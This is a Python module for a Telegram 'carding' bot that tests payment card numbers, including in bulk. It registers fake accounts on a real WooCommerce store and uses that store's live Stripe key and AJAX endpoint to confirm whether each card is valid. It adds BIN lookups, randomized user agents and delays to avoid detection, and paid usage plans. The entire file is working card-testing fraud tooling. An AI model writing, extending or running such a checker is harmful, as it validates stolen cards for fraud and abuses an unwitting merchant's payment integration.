# gates/auth/stauth.py (fixed version with proper WordPress session)

import asyncio
import json
import re
import time
import httpx
import random
import string
from datetime import datetime
from telethon import events, Button
from shared import (
    PLANS, get_user_plan, is_user_banned,
    get_user_session, increment_gate_usage,
    can_user_use_command, update_user_cooldown,
    get_gate_usage_count, increment_mass_check_usage
)

class StripeAuthChecker:
    def __init__(self, session):
        self.session = session
        self.user_agent = self.generate_user_agent()
        self.bin_cache = {}
        self.last_bin_request = 0
        self.request_timeout = 35.0
        self.base_url = "https://simonapouchescy.com"
        self.stripe_key = "pk_live_51I6wp3COExl9jV4CcKbaN3EFxcAB50pTrNUO8OPoGViHyLMPXUBRLDgqu1kYLj1nLkW24fENgejrjKvodrvFaTBY00cQmieKcs"
        
        self.bin_services = [
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            },
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            }
        ]

    def generate_user_agent(self):
        chrome_version = random.randint(110, 120)
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"

    def parse_binlist_net(self, data):
        return {
            'scheme': data.get('scheme', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A'),
            'bank': data.get('bank', {}).get('name', 'N/A'),
            'country': data.get('country', {}).get('name', 'N/A'),
            'country_code': data.get('country', {}).get('alpha2', 'N/A')
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A'
                }

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A'),
            'bank': data.get('bank', 'N/A'),
            'country': data.get('country', 'N/A'),
            'country_code': data.get('country', 'N/A')
        }

    async def get_bin_info(self, cc):
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A'
            }
            
        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A'
        }

        for service in self.bin_services:
            try:
                url = service['url'].format(bin=bin_number)
                headers = service['headers']

                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        try:
                            data = response.json()
                            result = service['parser'](data)
                            self.bin_cache[bin_number] = result
                            return result
                        except:
                            continue
            except Exception:
                continue

        self.bin_cache[bin_number] = default_response
        return default_response

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, bin_info=None):
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        status_emoji = "✅" if "APPROVED" in status else "❌"
        
        return (
            f"╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
            f"⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
            f"─────────◆─────────\n"
            f"𝑺𝒕𝒂𝒕𝒖𝒔: {status} {status_emoji}\n"
            f"𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
            f"𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
            f"─────────◆─────────\n"
            f"𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
            f"𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
            f"𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
            f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
            f"─────────◆─────────\n"
            f"𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
            f"╚═✦✧✦═╩═✦✧✦═╩═✦✧✦═╝"
        )

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return (
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"𝑺𝒕𝒂𝒕𝒖𝒔 -» 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 𝑪𝑪.....\n"
            f"𝑮𝑨𝑻𝑬 -» StripeAuth ♻️\n"
            f"𝑪𝑪 -» `{cc}|{mes}|{ano}|{cvv}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"𝑼𝒔𝒆𝒓 𝑷𝒍𝒂𝒏 -» {user_plan}\n"
            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 -» @{username}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━"
        )

    async def create_authenticated_session(self):
        """Create a fully authenticated WordPress session"""
        try:
            # Create persistent client
            client = httpx.AsyncClient(
                timeout=30.0,
                follow_redirects=True,
                headers={
                    'User-Agent': self.user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
            )

            # Step 1: Visit homepage to get initial cookies
            print("Step 1: Visiting homepage...")
            await client.get(f"{self.base_url}/")
            await asyncio.sleep(2)

            # Step 2: Register a new user account
            print("Step 2: Registering new user...")
            register_success = await self.register_new_user(client)
            if not register_success:
                await client.aclose()
                return None, None, "Failed to register user"

            # Step 3: Visit account page to establish session
            print("Step 3: Establishing account session...")
            account_response = await client.get(f"{self.base_url}/my-account-2/")
            await asyncio.sleep(2)

            # Step 4: Get payment method page with fresh nonce
            print("Step 4: Getting payment page nonce...")
            payment_url = f"{self.base_url}/my-account-2/add-payment-method/"
            payment_response = await client.get(payment_url)
            
            if payment_response.status_code != 200:
                await client.aclose()
                return None, None, f"Payment page failed: {payment_response.status_code}"

            response_text = payment_response.text

            # Extract nonce - try multiple patterns
            nonce_patterns = [
                r'createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"',
                r'"_ajax_nonce":"([a-f0-9]{10})"',
                r'name="_ajax_nonce" value="([a-f0-9]{10})"',
                r'nonce":"([a-f0-9]{10})"',
                r'nonce.*?"([a-f0-9]{10})"'
            ]

            nonce = None
            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, response_text)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    print(f"Found nonce: {nonce}")
                    break

            if not nonce:
                await client.aclose()
                return None, None, "Nonce token not found"

            return client, nonce, "Success"

        except Exception as e:
            try:
                await client.aclose()
            except:
                pass
            return None, None, f"Session creation failed: {str(e)}"

    async def register_new_user(self, client):
        """Register a new WordPress user with proper form data"""
        try:
            # Generate random user data
            random_id = random.randint(100000, 999999)
            username = f"user{random_id}"
            email = f"{username}@gmail.com"
            password = f"Pass{random.randint(10000, 99999)}!"

            # First get the registration page to extract all required fields
            reg_url = f"{self.base_url}/my-account-2/"
            reg_response = await client.get(reg_url)
            reg_text = reg_response.text

            # Extract registration nonce
            reg_nonce_pattern = r'name="woocommerce-register-nonce" value="([a-f0-9]{10})"'
            reg_nonce_match = re.search(reg_nonce_pattern, reg_text)
            
            if not reg_nonce_match:
                print("Registration nonce not found")
                return False

            reg_nonce = reg_nonce_match.group(1)
            print(f"Registration nonce: {reg_nonce}")

            # Extract other required hidden fields
            wp_http_referer_match = re.search(r'name="_wp_http_referer" value="([^"]*)"', reg_text)
            wp_http_referer = wp_http_referer_match.group(1) if wp_http_referer_match else "/my-account-2/"

            # Prepare complete registration data
            reg_data = {
                'email': email,
                'password': password,
                'mailchimp_woocommerce_newsletter': '1',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f'{self.base_url}/my-account-2/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': wp_http_referer,
                'register': 'Register'
            }

            print(f"Registering user: {email}")

            # Submit registration
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': reg_url,
                'User-Agent': self.user_agent
            }

            response = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)
            
            # Check if registration was successful
            if response.status_code in [200, 302]:
                # Check if we got logged in cookies
                if 'wordpress_logged_in' in str(response.cookies) or 'woocommerce_items_in_cart' in str(response.cookies):
                    print("Registration successful - user logged in")
                    return True
                else:
                    print("Registration may have failed - no login cookies")
                    # Try to continue anyway
                    return True
            else:
                print(f"Registration failed with status: {response.status_code}")
                return False

        except Exception as e:
            print(f"Registration error: {str(e)}")
            return False

    async def check_card(self, card_details, username, user_plan):
        start_time = time.time()
        cc, mes, ano, cvv = "", "", "", ""
        client = None

        try:
            # Parse card details with validation
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Basic validation
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time)
            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time)
            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time)
            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time)

            # Format year if needed
            if len(ano) == 2:
                ano = '20' + ano

            # Step 1: Create authenticated session
            client, nonce, session_msg = await self.create_authenticated_session()
            if not nonce:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, time.time()-start_time)

            # Step 2: Create payment method via Stripe API
            stripe_url = "https://api.stripe.com/v1/payment_methods"
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent
            }

            # Generate random session IDs
            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
            
            stripe_data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': ano,
                'card[exp_month]': mes,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': '10080',
                'billing_details[address][country]': 'US',
                'pasted_fields': 'number',
                'payment_user_agent': f'stripe.js/8e9b241db6; stripe-js-v3/8e9b241db6; payment-element; deferred-intent',
                'referrer': self.base_url,
                'time_on_page': '89456',
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'guid': 'NA',
                'muid': 'NA', 
                'sid': 'NA',
                'key': self.stripe_key,
                '_stripe_version': '2024-06-20'
            }

            print("Creating Stripe payment method...")
            stripe_response = await client.post(stripe_url, headers=stripe_headers, data=stripe_data)
            
            if stripe_response.status_code != 200:
                error_text = stripe_response.text[:100] if stripe_response.text else "No response"
                bin_info = await self.get_bin_info(cc)
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Stripe Error: {error_text}", username, time.time()-start_time, bin_info)

            stripe_json = stripe_response.json()

            if "error" in stripe_json:
                error_msg = stripe_json["error"].get("message", "Stripe declined")
                bin_info = await self.get_bin_info(cc)
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, bin_info)

            payment_method_id = stripe_json.get("id")
            if not payment_method_id:
                bin_info = await self.get_bin_info(cc)
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", username, time.time()-start_time, bin_info)

            print(f"Payment method created: {payment_method_id}")

            # Step 3: Confirm setup intent via WordPress AJAX
            ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
            ajax_headers = {
                'User-Agent': self.user_agent,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.base_url,
                'Connection': 'keep-alive',
                'Referer': f"{self.base_url}/my-account-2/add-payment-method/",
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }

            ajax_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce
            }

            print("Sending AJAX request to confirm setup intent...")
            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
            
            # Close client
            await client.aclose()

            print(f"AJAX Response status: {ajax_response.status_code}")
            
            if ajax_response.status_code != 200:
                # Try to get error details
                error_detail = "Bad Request"
                try:
                    error_json = ajax_response.json()
                    if isinstance(error_json, dict):
                        if 'data' in error_json and 'message' in error_json['data']:
                            error_detail = error_json['data']['message']
                except:
                    pass
                    
                bin_info = await self.get_bin_info(cc)
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, time.time()-start_time, bin_info)

            try:
                result = ajax_response.json()
                print(f"AJAX Response: {result}")
                
                if result.get("success"):
                    bin_info = await self.get_bin_info(cc)
                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, time.time()-start_time, bin_info)
                else:
                    error_data = result.get("data", {})
                    error_message = "Transaction Declined"
                    
                    # Extract detailed error message
                    if isinstance(error_data, dict):
                        if "error" in error_data:
                            error_obj = error_data["error"]
                            if isinstance(error_obj, dict):
                                error_message = error_obj.get("message", "Card Declined")
                            else:
                                error_message = str(error_obj)
                        elif "message" in error_data:
                            error_message = error_data["message"]
                    elif isinstance(error_data, str):
                        error_message = error_data
                    
                    bin_info = await self.get_bin_info(cc)
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time, bin_info)

            except json.JSONDecodeError as e:
                bin_info = await self.get_bin_info(cc)
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Invalid server response", username, time.time()-start_time, bin_info)

        except httpx.TimeoutException:
            if client:
                await client.aclose()
            bin_info = await self.get_bin_info(cc)
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, bin_info)
        except httpx.ConnectError:
            if client:
                await client.aclose()
            bin_info = await self.get_bin_info(cc)
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, bin_info)
        except Exception as e:
            if client:
                await client.aclose()
            bin_info = await self.get_bin_info(cc) if cc else None
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, bin_info)

async def handle_stripe_auth(event):
    try:
        user_id = event.sender_id
        if is_user_banned(user_id):
            await event.respond("⛔ You have been banned from using this bot.")
            return

        args = event.message.text.split()
        if len(args) < 2:
            await event.respond("❗Please provide card details in format: `/au cc|mm|yy|cvv`")
            return

        card_details = args[1]
        username = event.sender.username or str(user_id)
        user_plan = get_user_plan(user_id)

        # Check usage limits - pass is_gate_command=True for /au command
        can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
        if not can_use:
            await event.respond(reason)
            return

        session = get_user_session(user_id)
        checker = StripeAuthChecker(session)

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await event.respond("❌ Invalid card format. Use: `/au cc|mm|yy|cvv`")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        processing_msg = await event.respond(
            checker.get_processing_message(cc, mes, ano, cvv, username, user_plan))

        result = await checker.check_card(card_details, username, user_plan)

        # Update gate usage and cooldown
        increment_gate_usage(user_id)
        update_user_cooldown(user_id)

        await processing_msg.edit(result)
        
    except Exception as e:
        error_msg = str(e)[:150]
        await event.respond(f"❌ Bot error in /au command: {error_msg}")

async def handle_mass_stripe_auth(event):
    try:
        user_id = event.sender_id
        if is_user_banned(user_id):
            await event.respond("⛔ You have been banned from using this bot.")
            return

        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.respond("❗Please provide card details in format:\n"
                               "`/mau`\n"
                               "`cc|mm|yy|cvv`\n"
                               "`cc|mm|yy|cvv`\n"
                               "...")
            return

        username = event.sender.username or str(user_id)
        user_plan = get_user_plan(user_id)

        card_list = [card.strip() for card in args[1:] if card.strip()]
        card_count = len(card_list)

        # Check mass check usage limits
        can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True, is_mass_check=True, card_count=card_count)
        if not can_use:
            await event.respond(reason)
            return

        # Update mass check usage (only for non-GOD users)
        if user_plan != "GOD":
            increment_mass_check_usage(user_id)

        session = get_user_session(user_id)
        checker = StripeAuthChecker(session)

        processing_msg = await event.respond("🔄 Starting mass Stripe auth check...")

        results = []
        successful = 0
        failed = 0

        for i, card_details in enumerate(card_list):
            card_details = card_details.strip()
            if not card_details:
                continue

            cc_parts = card_details.split('|')
            if len(cc_parts) != 4:
                results.append(f"❌ Invalid format: {card_details}")
                failed += 1
                continue

            cc, mes, ano, cvv = cc_parts
            cc = cc.strip()
            mes = mes.strip()
            ano = ano.strip()
            cvv = cvv.strip()

            await processing_msg.edit(f"🔄 Processing card {i+1}/{len(card_list)}: `{cc}|{mes}|{ano}|{cvv}`")

            result = await checker.check_card(card_details, username, user_plan)
            results.append(result)

            if "APPROVED" in result:
                successful += 1
            else:
                failed += 1

            increment_gate_usage(user_id)
            update_user_cooldown(user_id)

            if i < len(card_list) - 1:
                await asyncio.sleep(random.uniform(12, 18))

        response = f"🔍 **Mass Stripe Auth Results**\n"
        response += f"✅ Approved: {successful} | ❌ Declined: {failed}\n\n"
        
        for i, result in enumerate(results):
            response += f"**Card {i+1}:**\n{result}\n\n"

        response += f"📊 Total: {len(card_list)} | Checked by: @{username}"

        await processing_msg.edit(response)
        
    except Exception as e:
        error_msg = str(e)[:150]
        await event.respond(f"❌ Bot error in /mau command: {error_msg}")
